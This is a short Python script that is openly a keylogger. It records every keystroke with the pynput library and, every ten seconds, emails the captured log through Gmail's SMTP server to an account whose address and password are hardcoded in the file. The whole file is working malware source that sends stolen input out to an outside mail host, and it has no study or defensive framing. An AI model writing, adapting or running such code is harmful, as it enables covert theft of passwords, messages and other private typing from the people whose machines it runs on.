#!/usr/bin/env python
import pynput.keyboard, smtplib, threading
log = ""


def sent_smtp(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, "Keylogger\n\n" + message)
    server.quit()


def respons():
    global log
    if log:
        sent_smtp("test10good@gmail.com", "goodgyme", log)
    log = ""
    time = threading.Timer(10, respons)
    time.start()


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


keyboard = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard:
    respons()
    keyboard.join()